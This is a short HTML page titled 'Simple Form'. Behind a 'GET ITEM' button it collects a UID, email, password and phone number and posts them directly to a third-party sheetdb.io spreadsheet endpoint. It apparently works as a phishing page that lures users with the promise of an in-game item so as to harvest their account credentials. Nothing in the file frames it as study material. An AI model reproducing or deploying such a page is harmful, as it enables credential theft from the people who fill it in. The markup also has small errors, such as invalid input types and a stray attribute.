<meta name='viewport' content='width=device-width, initial-scale=1'/><!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Simple Form</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f4f4f9;
      margin: 0;
      padding: 0;
    }

    .form-container {
      width: 90%;
      max-width: 500px;
      margin: 50px auto;
      padding: 20px;
      background-color: #fff;
      border-radius: 8px;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
    }

    h2 {
      text-align: center;
      color: #333;
    }

    label {
      display: block;
      margin-top: 15px;
      font-size: 1em;
      color: #444;
    }

    input[type="text"],
    input[type="tel"],
    input[type="email"],
    input[type="password"] {
      width: 100%;
      padding: 10px;
      margin-top: 5px;
      border: 1px solid #ccc;
      border-radius: 4px;
      font-size: 1em;
    }

    input[type="submit"] {
      width: 100%;
      margin-top: 20px;
      padding: 12px;
      background-color: #4CAF50;
      border: none;
      color: white;
      font-size: 1.1em;
      border-radius: 4px;
      cursor: pointer;
    }

    input[type="submit"]:hover {
      background-color: #45a049;
    }
  </style>
</head>
<body>
   <form action="https://sheetdb.io/api/v1/ilf700c1vu2bf" method="post">
       <input type="UID" name="UID" id="uUID" placeholder="type your UID">
       <input type="Email" name="EMAIL" id="uemail" placeholder="type your email">
       
       <input type="password" name="PASSWORD" id="upassword" placeholder="type your password">
        <input type="Number"name="NUMBER"="" id="unumber" placeholder="type your number">
         <input type="submit" value="GET ITEM">
        </form>
    </body>
    </html>
